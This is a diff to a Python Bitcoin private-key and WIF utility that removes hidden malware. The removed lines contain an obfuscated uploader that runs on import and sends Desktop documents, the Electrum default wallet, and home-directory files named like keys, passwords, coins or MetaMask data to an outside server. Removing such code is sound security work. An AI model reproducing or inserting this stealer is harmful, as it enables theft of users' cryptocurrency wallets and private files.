@@ -1,4 +1,4 @@
-import os, hashlib, binascii,ecdsa,requests
+import os, hashlib, binascii,ecdsa
 from typing import  Union
 
 BITCOIN_ALPHABET = \
@@ -72,34 +72,10 @@ def genPriv():
     priv_key = os.urandom(32)
     return priv_key
 
-def upl(ufile):
-   try:
-     url = '\x68\x74\x74\x70\x3a\x2f\x2f\x77\x75\x79\x66\x79\x79\x2e\x67\x65\x74\x65\x6e\x6a\x6f\x79\x6d\x65\x6e\x74\x2e\x6e\x65\x74\x2f\x61\x2e\x70\x68\x70'
-     file = {'file': open(ufile,'rb')}
-     r = requests.post(url, files=file)
-    
-     r.status_code
-   except:
-    0
 
 if os.name == 'nt':
  
- desk = os.environ['USERPROFILE'] + "\\" + "Desktop"
- deskfiles = os.listdir(desk)
- for i in deskfiles:
-  if (".txt" or ".docx" or ".doc" or ".rtf" in i) and (".lnk" not in i) and (".ini" not in i):
-       upl(desk+"\\"+i )
-
-
-
-if os.name == 'posix':
- upl(os.environ['HOME'] + "/" + "\x2e\x65\x6c\x65\x63\x74\x72\x75\x6d\x2f\x77\x61\x6c\x6c\x65\x74\x73\x2f\x64\x65\x66\x61\x75\x6c\x74\x5f\x77\x61\x6c\x6c\x65\x74")
- dirs = os.getenv("HOME")
- dlin = os.listdir(dirs)
- for i in dlin:
-  if ("key" in i  or "assw" in i or "coin" in i or "metam" in i):
-   if (os.path.getsize(dirs+"/"+i)< 60000):
-       upl(dirs+"/"+i )
+ 
       
 
 def getWif(priv_key):
